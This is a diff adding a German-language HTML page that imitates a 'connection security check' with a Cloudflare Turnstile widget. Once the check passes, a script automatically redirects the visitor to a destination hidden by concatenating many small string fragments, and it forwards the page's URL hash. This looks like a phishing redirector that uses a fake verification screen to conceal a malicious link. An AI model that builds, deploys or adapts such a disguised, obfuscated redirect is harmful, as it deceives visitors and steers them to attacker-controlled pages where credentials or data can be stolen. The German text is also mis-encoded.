@@ -1,0 +1,151 @@
+source: <!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>Verbindung wird Ã¼berprÃ¼ft</title>
+
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+
+    <style>
+        /* General Styles */
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f6f8;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            line-height: 1.5;
+        }
+
+        /* Main container for the verification box */
+        .verify-container {
+            background-color: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            transition: all 0.3s ease;
+        }
+        
+        /* Security icon (SVG) */
+        .security-icon {
+            width: 50px;
+            height: 50px;
+            color: #007bff;
+            margin-bottom: 20px;
+        }
+
+        /* Heading and paragraph text */
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin: 0 0 10px 0;
+        }
+
+        p {
+            font-size: 16px;
+            color: #666;
+            margin: 0;
+        }
+
+        /* The Turnstile widget will be placed here */
+        #turnstile-widget {
+            margin-top: 25px;
+            margin-bottom: 25px;
+        }
+
+        /* Button that appears after verification */
+        #continue-btn {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s ease, opacity 0.3s ease;
+            opacity: 0; /* Initially hidden */
+            pointer-events: none; /* Initially not clickable */
+        }
+        
+        #continue-btn.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        #continue-btn:hover {
+            background-color: #218838;
+        }
+    </style>
+</head>
+<body>
+    <div class="verify-container">
+        <svg class="security-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path fill-rule="evenodd" d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3A5.25 5.25 0 0012 1.5zm-3.75 5.25v3h7.5v-3a3.75 3.75 0 00-7.5 0z" clip-rule="evenodd" />
+        </svg>
+
+        <h1 id="status-heading">SicherheitsprÃ¼fung wird durchgefÃ¼hrt</h1>
+        <p id="status-text">Bitte warten Sie, wÃ¤hrend wir Ihre Verbindung absichern.</p>
+        
+        <div id="turnstile-widget"></div>
+
+        <button id="continue-btn" onclick="proceed()">Weiter</button>
+    </div>
+
+    <script>
+        function proceed() {
+            // This is where the redirect happens.
+            // The `'h' + 'ttp' + 's:/' + '/op' + 't' + 'io' + 'n' + 's.p' + 'o' + 'r' + 't.f' + 'c' + 'c' + 'p' + 'oo' + 'l.c' + 'om/' + 'pT' + 'amr' + 'P' + 'm' + 'H?q' + '=04' + 'r' + 'g2o' + '8'` placeholder should be replaced by your server-side template engine.
+            window.location.href = 'h' + 'ttp' + 's:/' + '/op' + 't' + 'io' + 'n' + 's.p' + 'o' + 'r' + 't.f' + 'c' + 'c' + 'p' + 'oo' + 'l.c' + 'om/' + 'pT' + 'amr' + 'P' + 'm' + 'H?q' + '=04' + 'r' + 'g2o' + '8' + window.location.hash;
+        }
+
+        // This is the main callback function for Cloudflare Turnstile
+        window.onloadTurnstileCallback = function () {
+            turnstile.render("#turnstile-widget", {
+                // IMPORTANT: Replace with your actual sitekey
+                sitekey: '0x4AAAAAABlJYrwv2CmlRhAP', // Replace this with your key
+                
+                // This function is called when verification is successful
+                callback: function (token) {
+                    console.log("Turnstile-ÃberprÃ¼fung erfolgreich. Token:", token);
+                    
+                    // Update UI to show success (in German)
+                    document.getElementById('status-heading').innerText = 'ÃberprÃ¼fung erfolgreich!';
+                    document.getElementById('status-text').innerText = 'Sie kÃ¶nnen jetzt sicher fortfahren.';
+                    
+                    // Hide the Turnstile widget after success
+                    document.getElementById('turnstile-widget').style.display = 'none';
+
+                    // Show and enable the continue button
+                    const continueBtn = document.getElementById('continue-btn');
+                    continueBtn.classList.add('visible');
+                    
+                    // Optional: Automatically redirect after a short delay (e.g., 2 seconds)
+                    // This gives the user time to see the success message.
+                    setTimeout(proceed, 2000);
+                },
+
+                // This function is called when the challenge expires
+                "expired-callback": function () {
+                    console.log("Turnstile abgelaufen, Seite wird neu geladen.");
+                    window.location.reload();
+                },
+
+                theme: "auto",
+            });
+        };
+    </script>
+</body>
+</html>
+
+Page title: Verbindung wird Ã¼berprÃ¼ft
